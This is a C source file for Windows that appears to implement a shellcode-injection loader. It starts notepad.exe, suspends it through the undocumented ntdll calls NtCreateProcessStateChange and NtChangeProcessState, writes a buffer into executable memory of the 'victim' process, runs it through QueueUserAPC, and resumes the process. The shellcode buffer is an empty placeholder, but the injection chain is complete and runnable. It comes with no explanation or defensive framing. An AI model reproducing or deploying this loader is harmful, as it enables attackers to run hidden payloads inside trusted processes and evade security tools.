```c
#include <Windows.h>
#include <stdio.h>
#include <winternl.h>

typedef NTSTATUS(__fastcall* NtCreateProcessStateChange)(OUT PHANDLE StateChangeHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN HANDLE ProcessHandle, IN INT Unknown);
typedef NTSTATUS(__fastcall* NtChangeProcessState)(IN HANDLE StateChangeHandle, IN HANDLE ProcessHandle, IN ULONG Action, IN ULONG64 Unknown1, IN ULONG64 Unknown2, IN ULONG64 Unknown3);

void main()
{
    HANDLE stateChangeHandle;
    PROCESS_INFORMATION procInfo;
    PROCESS_INFORMATION procInfo2;
    STARTUPINFO startInfo;
    BOOL result;
    NTSTATUS status;
    NtCreateProcessStateChange	pNtCreateProcessStateChange;
    NtChangeProcessState        pNtChangeProcessState;
    HMODULE                     hNtdll;
    unsigned char buf[] = "\x00";

    SIZE_T shellSize = sizeof(buf);
    stateChangeHandle = nullptr;
    ZeroMemory(&startInfo, sizeof(startInfo));
    startInfo.cb = sizeof(startInfo);

    result = CreateProcess(L"C:\\Windows\\System32\\notepad.exe",NULL,NULL,NULL,FALSE,0,NULL,NULL,&startInfo,&procInfo);

    HANDLE victimProcess = procInfo.hProcess;
    HANDLE threadHandle = procInfo.hThread;
    hNtdll = GetModuleHandle(L"ntdll.dll");

    pNtCreateProcessStateChange = (NtCreateProcessStateChange)GetProcAddress(hNtdll, "NtCreateProcessStateChange");
    pNtChangeProcessState       = (NtChangeProcessState)GetProcAddress(hNtdll, "NtChangeProcessState");

    status = pNtCreateProcessStateChange(&stateChangeHandle, MAXIMUM_ALLOWED, NULL, procInfo.hProcess, 0);
    status = pNtChangeProcessState(stateChangeHandle, procInfo.hProcess, 0, NULL, 0, 0);

    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);
    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);

    status = pNtChangeProcessState(stateChangeHandle, procInfo.hProcess, 1, NULL, 0, 0);
}
  
